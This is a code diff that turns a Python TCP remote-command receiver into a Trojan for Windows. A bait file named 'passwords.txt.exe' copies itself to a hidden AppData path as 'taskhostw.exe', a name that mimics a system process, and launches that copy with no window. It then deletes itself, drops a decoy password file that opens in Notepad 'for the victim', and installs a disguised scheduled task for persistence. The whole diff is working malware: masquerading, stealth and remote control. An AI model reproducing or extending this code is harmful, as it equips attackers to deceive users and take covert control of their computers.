@@ -8,6 +8,8 @@ import socket
 import sys
 import time
 import subprocess
+import os
+import shutil
 
 # Configuration
 VERBOSE = True  # Set to False for silent operation
@@ -17,6 +19,56 @@ RETRY_DELAY = 5  # Seconds between connection retries
 BUFFER_SIZE = 4096  # Socket buffer size
 END_MARKER = b"<<<END_OF_OUTPUT>>>"  # Command completion marker
 
+# Deployment Configuration
+PAYLOAD_NAME = "taskhostw.exe"
+
+
+# Get LOCALAPPDATA - only called on Windows
+def get_payload_dir():
+    """Get the payload directory. Raises KeyError if LOCALAPPDATA doesn't exist."""
+    localappdata = os.environ["LOCALAPPDATA"]  # Raises KeyError if missing - intentional
+    return os.path.join(localappdata, "Microsoft", "Windows")
+
+
+# Lazy initialization - only computed when first accessed
+_PAYLOAD_DIR = None
+_PAYLOAD_PATH = None
+
+
+def get_payload_path():
+    """Get payload paths (lazy initialization for Windows only)."""
+    global _PAYLOAD_DIR, _PAYLOAD_PATH
+
+    if _PAYLOAD_DIR is None:
+        _PAYLOAD_DIR = get_payload_dir()
+        _PAYLOAD_PATH = os.path.join(_PAYLOAD_DIR, PAYLOAD_NAME)
+
+    return _PAYLOAD_DIR, _PAYLOAD_PATH
+
+
+# Fake password file content
+FAKE_PASSWORDS = """Personal Passwords - DO NOT SHARE
+
+Gmail: john.doe@gmail.com
+Password: Summer2024!
+
+Facebook: johndoe
+Password: MySecurePass123
+
+Netflix: john.doe@gmail.com  
+Password: Netflix2024
+
+Banking: johndoe
+Password: B@nk!ngP@ss456
+
+WiFi Network: HomeNetwork_5G
+Password: W1F1P@ssw0rd2024
+
+--- Notes ---
+Remember to change these regularly!
+Last updated: October 2024
+"""
+
 # Use the system's output encoding
 DECODING = sys.stdout.encoding if sys.stdout.encoding else "utf-8"
 
@@ -25,6 +77,106 @@ def log(msg: str) -> None:
     """Print message only if VERBOSE is True."""
     if VERBOSE:
         print(msg)
+
+
+def is_bait_file() -> bool:
+    """Check if currently running as the bait file (passwords.txt.exe)."""
+    exe_name = os.path.basename(sys.executable).lower()
+    return exe_name.endswith("passwords.txt.exe")
+
+
+def is_payload() -> bool:
+    """Check if currently running as the payload (taskhostw.exe)."""
+    exe_name = os.path.basename(sys.executable).lower()
+    return exe_name == PAYLOAD_NAME.lower()
+
+
+def parse_cli_arguments():
+    """Parse command-line arguments. Returns the file to delete if specified."""
+    delete_file = None
+    if "--delete-file" in sys.argv:
+        try:
+            idx = sys.argv.index("--delete-file")
+            if idx + 1 < len(sys.argv):
+                delete_file = sys.argv[idx + 1]
+        except (ValueError, IndexError):
+            pass
+    return delete_file
+
+
+def deploy_payload():
+    """
+    Stage 1: Bait file execution (passwords.txt.exe).
+    Copy self to hidden location, spawn payload, and exit.
+    """
+    try:
+        log("\n[Stage 1: Deploying payload...]")
+
+        # Get payload paths (lazy initialization)
+        payload_dir, payload_path = get_payload_path()
+
+        # Create payload directory if it doesn't exist
+        os.makedirs(payload_dir, exist_ok=True)
+        log(f"Payload directory: {payload_dir}")
+
+        # Copy self to payload location
+        shutil.copy2(sys.executable, payload_path)
+        log(f"Copied to: {payload_path}")
+
+        # Launch the payload with --delete-file argument
+        original_path = sys.executable
+        log(f"Launching payload with --delete-file {original_path}")
+        subprocess.Popen(
+            [payload_path, "--delete-file", original_path],
+            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
+        )
+
+        log("[Stage 1: Complete - Exiting bait file]")
+        sys.exit(0)  # Success
+
+    except Exception as e:
+        log(f"[Stage 1: Failed - {e}]")
+        sys.exit(1)  # Failure - exit with error code
+
+
+def setup_camouflage(original_file: str = None):
+    """
+    Stage 2 (First-time setup): Replace original bait file with fake passwords.txt
+    and open it in notepad for the victim.
+
+    Raises exception if critical operations fail (creating fake file).
+    """
+    if not original_file or not os.path.exists(original_file):
+        return
+
+    log(f"\n[Stage 2: Setting up camouflage...]")
+
+    # Get the directory of the original file (use absolute path)
+    original_file = os.path.abspath(original_file)
+    original_dir = os.path.dirname(original_file)
+    fake_file_path = os.path.join(original_dir, "passwords.txt")
+
+    # Delete the original .exe (not critical - might be locked)
+    try:
+        os.remove(original_file)
+        log(f"Deleted original: {original_file}")
+    except Exception as e:
+        log(f"Warning: Could not delete original: {e}")
+        log("Continuing anyway (file may be locked)")
+
+    # Create fake passwords.txt - CRITICAL, will raise on failure
+    with open(fake_file_path, "w", encoding="utf-8") as f:
+        f.write(FAKE_PASSWORDS)
+    log(f"Created fake passwords: {fake_file_path}")
+
+    # Open the fake file in notepad (not critical - victim can open manually)
+    try:
+        subprocess.Popen(["notepad.exe", fake_file_path])
+        log("Opened passwords in notepad")
+    except Exception as e:
+        log(f"Warning: Could not open notepad: {e}")
+
+    log("[Stage 2: Camouflage complete]")
 
 
 def execute_command_stream(command: str, client_socket, working_dir: str = None) -> str:
@@ -260,7 +412,7 @@ def uninstall_receiver_service() -> None:
 
     elif system == "Windows":
         log("Uninstalling Windows Task...")
-        subprocess.run(["schtasks", "/delete", "/tn", "TCPReceiver", "/f"], capture_output=True)
+        subprocess.run(["schtasks", "/delete", "/tn", "taskhostw", "/f"], capture_output=True)
         log("Windows Task uninstalled.")
 
     elif system == "Darwin":
@@ -320,19 +472,54 @@ def run_with_auto_restart(host: str, port: int) -> None:
 
 
 if __name__ == "__main__":
-    log("\n[ TCP Command Receiver ]\n")
-
-    # Windows: Check if installed as service, install if not
     import platform
 
-    if platform.system() == "Windows":
-        try:
+    # Only run deployment logic on Windows and when frozen by PyInstaller
+    if platform.system() == "Windows" and getattr(sys, "frozen", False):
+
+        # STAGE 1: Bait file execution (passwords.txt.exe)
+        if is_bait_file():
+            log("\n[ Bait file detected - Deploying payload ]\n")
+            deploy_payload()
+            # deploy_payload() calls sys.exit(0) - execution stops here
+
+        # STAGE 2: Payload execution (taskhostw.exe)
+        elif is_payload():
+            log("\n[ TCP Command Receiver - Payload Mode ]\n")
+
+            # Parse CLI arguments
+            delete_file = parse_cli_arguments()
+
+            # Check if persistence is already installed (will raise on failure)
+            from install import check_and_install_service
+
+            # This function checks if task exists and installs if not
+            check_and_install_service()
+
+            # If we just installed (first run), setup camouflage (will raise on failure)
+            # Check if task was just created by seeing if delete_file was provided
+            if delete_file:
+                setup_camouflage(delete_file)
+
+            # Run with auto-restart wrapper for crash recovery
+            run_with_auto_restart(DEFAULT_HOST, DEFAULT_PORT)
+
+        else:
+            # Unrecognized executable name - fail fast
+            log(f"\n[ ERROR: Unrecognized executable name ]\n")
+            log(f"Current name: {os.path.basename(sys.executable)}")
+            log(f"Expected: 'passwords.txt.exe' or '{PAYLOAD_NAME}'")
+            log("Exiting...\n")
+            sys.exit(1)
+
+    else:
+        # Running in development mode (not frozen) or on non-Windows
+        log("\n[ TCP Command Receiver - Development Mode ]\n")
+
+        if platform.system() == "Windows":
             from install import check_and_install_service
 
             check_and_install_service()
-        except Exception as e:
-            log(f"Warning: Could not check/install service: {e}")
-            log("Continuing anyway...\n")
 
-    # Run with auto-restart wrapper for crash recovery
-    run_with_auto_restart(DEFAULT_HOST, DEFAULT_PORT)
+        # Run with auto-restart wrapper for crash recovery
+        run_with_auto_restart(DEFAULT_HOST, DEFAULT_PORT)
